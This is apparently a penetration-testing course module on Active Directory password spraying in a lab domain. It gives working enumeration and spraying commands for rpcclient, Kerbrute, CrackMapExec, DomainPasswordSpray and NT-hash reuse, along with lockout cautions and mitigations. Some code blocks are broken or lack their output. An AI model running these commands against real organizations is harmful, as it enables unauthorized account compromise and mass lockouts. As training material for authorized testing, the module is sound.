Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let's cover some of the considerations for Password spraying and how to make our target list from the information we have.

* * *

## Story Time

Password spraying can be a very effective way to gain a foothold internally. There are many times that this technique has helped me land a foothold during my assessments. Keep in mind that these examples come from non-evasive "grey box" assessments where I had internal network access with a Linux VM and a list of in-scope IP ranges and nothing else.

### Scenario 1

In this first example, I performed all my standard checks and could not find anything useful like an SMB NULL session or LDAP anonymous bind that could allow me to retrieve a list of valid users. So I decided to use the `Kerbrute` tool to build a target username list by enumerating valid domain users (a technique we will cover later in this section). To create this list, I took the `jsmith.txt` username list from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and combined this with results that I got from scraping LinkedIn. With this combined list in hand, I enumerated valid users with `Kerbrute` and then used the same tool to password spray with the common password `Welcome1`. I got two hits with this password for very low privileged users, but this gave me enough access within the domain to run BloodHound and eventually identify attack paths that led to domain compromise.

### Scenario 2

In the second assessment, I was faced with a similar setup, but enumerating valid domain users with common username lists, and results from LinkedIn did not yield any results. I turned to Google and searched for PDFs published by the organization. My search generated many results, and I confirmed in the document properties of 4 of them that the internal username structure was in the format of `F9L8`, randomly generated GUIDs using just capital letters and numbers ( `A-Z and 0-9`). This information was published with the document in the `Author` field and shows the importance of scrubbing document metadata before posting anything online. From here, a short Bash script could be used to generate 16,679,616 possible username combinations.

```bash

#!/bin/bash

for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x;
done

```

I then used the generated username list with `Kerbrute` to enumerate every single user account in the domain. This attempt to make it more difficult to enumerate usernames ended up with me being able to enumerate every single account in the domain because of the predictable GUID in use combined with the PDF metadata I could locate and greatly facilitated the attack. Typically, I can only identify 40-60% of valid accounts using a list such as `jsmith.txt`. In this example, I significantly increased my chances of a successful password spraying attack by starting the attack with ALL domain accounts in my target list. From here, I obtained valid passwords for a few accounts. Eventually, I was able to follow a complicated attack chain involving [Resource-Based Constrained Delegation (RBCD)](https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a) and the [Shadow Credentials](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition) attack to ultimately gain control over the domain.

* * *

## Password Spraying Considerations

While password spraying is useful for a penetration tester or red teamer, careless use may cause considerable harm, such as locking out hundreds of production accounts. One example is brute-forcing attempts to identify the password for an account using a long list of passwords. In contrast, password spraying is a more measured attack, utilizing very common passwords across multiple industries. The below table visualizes a password spray.

#### Password Spray Visualization

| **Attack** | **Username** | **Password** |
| --- | --- | --- |
| 1 | [\[email protected\]](/cdn-cgi/l/email-protection) | Welcome1 |
| 1 | [\[email protected\]](/cdn-cgi/l/email-protection) | Welcome1 |
| 1 | [\[email protected\]](/cdn-cgi/l/email-protection) | Welcome1 |
| DELAY |  |  |
| 2 | [\[email protected\]](/cdn-cgi/l/email-protection) | Passw0rd |
| 2 | [\[email protected\]](/cdn-cgi/l/email-protection) | Passw0rd |
| 2 | [\[email protected\]](/cdn-cgi/l/email-protection) | Passw0rd |

| 3 | [\[email protected\]](/cdn-cgi/l/email-protection) | Winter2022 |
| 3 | [\[email protected\]](/cdn-cgi/l/email-protection) | Winter2022 |

It involves sending fewer login requests per username and is less likely to lock out accounts than a brute force attack. However, password spraying still presents a risk of lockouts, so it is essential to introduce a delay between login attempts. Internal password spraying can be used to move laterally within a network, and the same considerations regarding account lockouts apply. However, it may be possible to obtain the domain password policy with internal access, significantly lowering this risk.

It’s common to find a password policy that allows five bad attempts before locking out the account, with a 30-minute auto-unlock threshold. Some organizations configure more extended account lockout thresholds, even requiring an administrator to unlock the accounts manually. If you don’t know the password policy, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset. It is best to obtain the password policy before attempting the attack during an internal assessment, but this is not always possible. We can err on the side of caution and either choose to do just one targeted password spraying attempt using a weak/common password as a "hail mary" if all other options for a foothold or furthering access have been exhausted. Depending on the type of assessment, we can always ask the client to clarify the password policy. If we already have a foothold or were provided a user account as part of testing, we can enumerate the password policy in various ways. Let's practice this in the next section.


# Enumerating & Retrieving Password Policies

* * *

## Enumerating the Password Policy - from Linux - Credentialed

As stated in the previous section, we can pull the domain password policy in several ways, depending on how the domain is configured and whether or not we have valid domain credentials. With valid domain credentials, the password policy can also be obtained remotely using tools such as [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or `rpcclient`.

```shell

## Enumerating the Password Policy - from Linux - SMB NULL Sessions

Without credentials, we may be able to obtain the password policy via an SMB NULL session or LDAP anonymous bind. The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.

When creating a domain in earlier versions of Windows Server, anonymous access was granted to certain shares, which allowed for domain enumeration. An SMB NULL session can be enumerated easily. For enumeration, we can use tools such as `enum4linux`, `CrackMapExec`, `rpcclient`, etc.

We can use [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) to check a Domain Controller for SMB NULL session access.

Once connected, we can issue an RPC command such as `querydominfo` to obtain information about the domain and confirm NULL session access.

#### Using rpcclient

rpcclient -U "" -N 172.16.5.5

We can also obtain the password policy. We can see that the password policy is relatively weak, allowing a minimum password of 8 characters.

Let's try this using [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux). `enum4linux` is a tool built around the [Samba suite of tools](https://www.samba.org/samba/docs/current/man-html/samba.7.html) `nmblookup`, `net`, `rpcclient` and `smbclient` to use for enumeration of windows hosts and domains. It can be found pre-installed on many different penetration testing distros, including Parrot Security Linux. Below we have an example output displaying information that can be provided by `enum4linux`. Here are some common enumeration tools and the ports they use:

| Tool | Ports |
| --- | --- |
| nmblookup | 137/UDP |
| nbtstat | 137/UDP |
| net | 139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535 |
| rpcclient | 135/TCP |
| smbclient | 445/TCP |

#### Using enum4linux

```shell
enum4linux -P 172.16.5.5

The tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of `enum4linux` in Python, but has additional features such as the ability to export data as YAML or JSON files which can later be used to process the data further or feed it to other tools. It also supports colored output, among other features

## Enumerating Null Session - from Windows

It is less common to do this type of null session attack from Windows, but we could use the command `net use \\host\ipc$ "" /u:""` to establish a null session from a windows machine and confirm if we can perform more of this type of attack.

#### Establish a null session from windows

```cmd-session
C:\htb> net use \\DC01\ipc$ "" /u:""
The command completed successfully.

```

We can also use a username/password combination to attempt to connect. Let's see some common errors when trying to authenticate:

#### Error: Account is Disabled

```cmd-session
C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.

```

#### Error: Password is Incorrect

```cmd-session
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.

```

#### Error: Account is locked out (Password Policy)

```cmd-session
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.

```

## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

[LDAP anonymous binds](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.

With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`, etc., to pull the password policy. With [ldapsearch](https://linux.die.net/man/1/ldapsearch), it can be a bit cumbersome but doable. One example command to get the password policy is as follows:

#### Using ldapsearch

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24

```

Here we can see the minimum password length of 8, lockout threshold of 5, and password complexity is set ( `pwdProperties` set to `1`).

* * *

## Enumerating the Password Policy - from Windows

If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as `net.exe` to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

Using built-in commands is helpful if we land on a Windows system and cannot transfer tools to it, or we are positioned on a Windows system by the client, but have no way of getting tools onto it. One example using the built-in net.exe binary is:

#### Using net.exe

```cmd-session
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.

```

Here we can glean the following information:

- Passwords never expire (Maximum password age set to Unlimited)
- The minimum password length is 8 so weak passwords are likely in use
- The lockout threshold is 5 wrong passwords
- Accounts remained locked out for 30 minutes

This password policy is excellent for password spraying. The eight-character minimum means that we can try common weak passwords such as `Welcome1`. The lockout threshold of 5 means that we can attempt 2-3 (to be safe) sprays every 31 minutes without the risk of locking out any accounts. If an account has been locked out, it will automatically unlock (without manual intervention from an admin) after 30 minutes, but we should avoid locking out `ANY` accounts at all costs.

PowerView is also quite handy for this:

#### Using PowerView

```powershell
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy

```

PowerView gave us the same output as our `net accounts` command, just in a different format but also revealed that password complexity is enabled ( `PasswordComplexity=1`).

As with Linux, we have many tools at our disposal to retrieve the password policy while on a Windows system, whether it is our attack system or a system provided by the client. PowerView/SharpView are always good bets, as are CrackMapExec, SharpMapExec, and others. The choice of tools depends on the goal of the assessment, stealth considerations, any anti-virus or EDR in place, and other potential restrictions on the target host. Let's cover a few examples.

* * *

## Analyzing the Password Policy

We've now pulled the password policy in numerous ways. Let's go through the policy for the INLANEFREIGHT.LOCAL domain piece by piece.

- The minimum password length is 8 (8 is very common, but nowadays, we are seeing more and more organizations enforce a 10-14 character password, which can remove some password options for us, but does not mitigate the password spraying vector completely)
- The account lockout threshold is 5 (it is not uncommon to see a lower threshold such as 3 or even no lockout threshold set at all)
- The lockout duration is 30 minutes (this may be higher or lower depending on the organization), so if we do accidentally lockout (avoid!!) an account, it will unlock after the 30-minute window passes
- Accounts unlock automatically (in some organizations, an admin must manually unlock the account). We never want to lockout accounts while performing password spraying, but we especially want to avoid locking out accounts in an organization where an admin would have to intervene and unlock hundreds (or thousands) of accounts by hand/script
- Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character ( `Password1` or `Welcome1` would satisfy the "complexity" requirement here, but are still clearly weak passwords).

The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:

| Policy | Default Value |
| --- | --- |
| Enforce password history | 24 days |
| Maximum password age | 42 days |
| Minimum password age | 1 day |
| Minimum password length | 7 |
| Password must meet complexity requirements | Enabled |
| Store passwords using reversible encryption | Disabled |
| Account lockout duration | Not set |
| Account lockout threshold | 0 |
| Reset account lockout counter after | Not set |

* * *

## Next Steps

Now that we have the password policy in hand, we need to create a target user list to perform our password spraying attack. Remember that sometimes we will not be able to obtain the password policy if we are performing external password spraying (or if we are on an internal assessment and cannot retrieve the policy using any of the methods shown here). In these cases, we `MUST` exercise extreme caution not to lock out accounts. We can always ask our client for their password policy if the goal is as comprehensive an assessment as possible. If asking for the policy does not fit the expectations of the assessment or the client does not want to provide it, we should run one, max two, password spraying attempts (regardless of whether we are internal or external) and wait over an hour between attempts if we indeed decide to attempt two. While most organizations will have a lockout threshold of 5 bad password attempts, a lockout duration of 30 minutes and accounts will automatically unlock, we cannot always count on this being normal. I have seen plenty of organizations with a lockout threshold of 3, requiring an admin to intervene and unlock accounts manually.

`We do not want to be the pentester that locks out every account in the organization!`

Let's now prepare to launch our password spraying attacks by gathering a list of target users.


# Password Spraying - Making a Target User List

* * *

## Detailed User Enumeration

To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. There are several ways that we can gather a target list of valid users:

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as `Kerbrute` to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using `Responder` or even a successful password spray using a smaller wordlist

No matter the method we choose, it is also vital for us to consider the domain password policy. If we have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, we can enumerate the password policy. Having this policy in hand is very useful because the minimum password length and whether or not password complexity is enabled can help us formulate the list of passwords we will try in our spray attempts. Knowing the account lockout threshold and bad password timer will tell us how many spray attempts we can do at a time without locking out any accounts and how many minutes we should wait between spray attempts.

Again, if we do not know the password policy, we can always ask our client, and, if they won't provide it, we can either try one very targeted password spraying attempt as a "hail mary" if all other options for a foothold have been exhausted. We could also try one spray every few hours in an attempt to not lock out any accounts. Regardless of the method we choose, and if we have the password policy or not, we must always keep a log of our activities, including, but not limited to:

- The accounts targeted
- Domain Controller used in the attack
- Time of the spray
- Date of the spray
- Password(s) attempted

This will help us ensure that we do not duplicate efforts. If an account lockout occurs or our client notices suspicious logon attempts, we can supply them with our notes to crosscheck against their logging systems and ensure nothing nefarious was going on in the network.

## SMB NULL Session to Pull User List

If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or `SYSTEM` access on a Windows host, then you can easily query Active Directory for this information.

It’s possible to do this using the SYSTEM account because it can `impersonate` the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.

Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include [enum4linux](https://github.com/portcullislabs/enum4linux), [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html), and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), among others. Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with `enum4linux` with the `-U` flag.

#### Using enum4linux

```shell
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>

```

We can use the `enumdomusers` command after connecting anonymously using `rpcclient`.

#### Using rpcclient

```shell
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>

```

Finally, we can use `CrackMapExec` with the `--users` flag. This is a useful tool that will also show the `badpwdcount` (invalid login attempts), so we can remove any accounts from our list that are close to the lockout threshold. It also shows the `baddpwdtime`, which is the date and time of the last bad password attempt, so we can see how close an account is to having its `badpwdcount` reset. In an environment with multiple Domain Controllers, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, we would have to either query each Domain Controller and use the sum of the values or query the Domain Controller with the PDC Emulator FSMO role.

#### Using CrackMapExec --users Flag

```shell
crackmapexec smb 172.16.5.5 --users

## Gathering Users with LDAP Anonymous

We can use various tools to gather users when we find an LDAP anonymous bind. Some examples include [windapsearch](https://github.com/ropnop/windapsearch) and [ldapsearch](https://linux.die.net/man/1/ldapsearch). If we choose to use `ldapsearch` we will need to specify a valid LDAP search filter. We can learn more about these search filters in the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.

#### Using ldapsearch

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez

```

Tools such as `windapsearch` make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the `-u` flag and the `-U` flag to tell the tool to retrieve just users.

#### Using windapsearch

```shell
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

## Enumerating Users with Kerbrute

As mentioned in the `Initial Enumeration of The Domain` section, if we have no access at all from our position in the internal network, we can use `Kerbrute` to enumerate valid AD accounts and for password spraying.

This tool uses [Kerberos Pre-Authentication](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication), which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for. The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once we have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so we still must be careful regardless of the method chosen.

Let's try out this method using the [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) wordlist of 48,705 possible common usernames in the format `flast`. The [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo is an excellent resource for this type of attack and contains a variety of different username lists that we can use to enumerate valid usernames using `Kerbrute`.

#### Kerbrute User Enumeration

```shell
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

    __             __               __

```

We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. Using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768). This will only be triggered if [Kerberos event logging](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If we are successful with this method during a penetration test, this can be an excellent recommendation to add to our report.

If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to mash up possible usernames from a company's LinkedIn page.

## Credentialed Enumeration to Build our User List

With valid credentials, we can use any of the tools stated previously to build a user list. A quick and easy way is using CrackMapExec.

#### Using CrackMapExec with Valid Credentials

```shell
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

## Now for the Fun

Now that we've covered creating a target user list for spraying and discussed password policies, let's get our hands dirty performing password spraying attacks a few ways from a Linux attack host and then from a Windows host.


# Internal Password Spraying - from Linux

* * *

Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.

* * *

## Internal Password Spraying from a Linux Host

Once we’ve created a wordlist using one of the methods shown in the previous section, it’s time to execute the attack. `Rpcclient` is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with `rpcclient`, with the response `Authority Name` indicating a successful login. We can filter out invalid login attempts by `grepping` for `Authority` in the response. The following Bash one-liner (adapted from [here](https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/)) can be used to perform the attack.

#### Using a Bash one-liner for the Attack

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

```

Let's try this out against the target environment.

```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT

```

We can also use `Kerbrute` for the same attack as discussed previously.

#### Using Kerbrute for the Attack

```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 [email protected]:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds

```

There are multiple other methods for performing password spraying from Linux. Another great option is using `CrackMapExec`. The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. Here we grep for `+` to filter out logon failures and hone in on only valid login attempts to ensure we don't miss anything by scrolling through many lines of output.

#### Using CrackMapExec & Filtering Logon Failures

```shell
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123

```

After getting one (or more!) hits with our password spraying attack, we can then use `CrackMapExec` to validate the credentials quickly against a Domain Controller.

#### Validating the Credentials with CrackMapExec

```shell
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123

```

* * *

## Local Administrator Password Reuse

Internal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account (or another privileged local account), this can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts.

CrackMapExec is a handy tool for attempting this attack. It is worth targeting high-value hosts such as `SQL` or `Microsoft Exchange` servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.

When working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers. Also, if we find non-standard local administrator accounts such as `bsmith`, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named `ajones`, it is worth trying the same password on their admin account (if the user has one), for example, `ajones_adm`, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.

Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) to hunt for local administrator accounts with the same password set. In the example below, we attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. `Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain`. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.

#### Local Admin Spraying with CrackMapExec

```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)

```

The output above shows that the credentials were valid as a local admin on `3` systems in the `172.16.5.0/23` subnet. We could then move to enumerate each system to see if we can find anything that will help further our access.

This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.


# Internal Password Spraying - from Windows

* * *

From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host but not authenticated to the domain. We may run into a situation where the client wants us to perform testing from a managed Windows device in their network that we can load tools onto. We may be physically on-site in their offices and wish to test from a Windows VM, or we may gain an initial foothold through some other attack, authenticate to a host in the domain and perform password spraying in an attempt to obtain credentials for an account that has more rights in the domain.

There are several options available to us with the tool. Since the host is domain-joined, we will skip the `-UserList` flag and let the tool generate a list for us. We'll supply the `Password` flag and one single password and then use the `-OutFile` flag to write our output to a file for later use.

#### Using DomainPasswordSpray.ps1

```powershell
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success

```

We could also utilize Kerbrute to perform the same user enumeration and spraying steps shown in the previous section. The tool is present in the `C:\Tools` directory if you wish to work through the same examples from the provided Windows host.

* * *

## Mitigations

Several steps can be taken to mitigate the risk of password spraying attacks. While no single solution will entirely prevent the attack, a defense-in-depth approach will render password spraying attacks extremely difficult.

| Technique | Description |
| --- | --- |
| `Multi-factor Authentication` | Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals. |
| `Restricting Access` | It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it. |
| `Reducing Impact of Successful Exploitation` | A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise. |
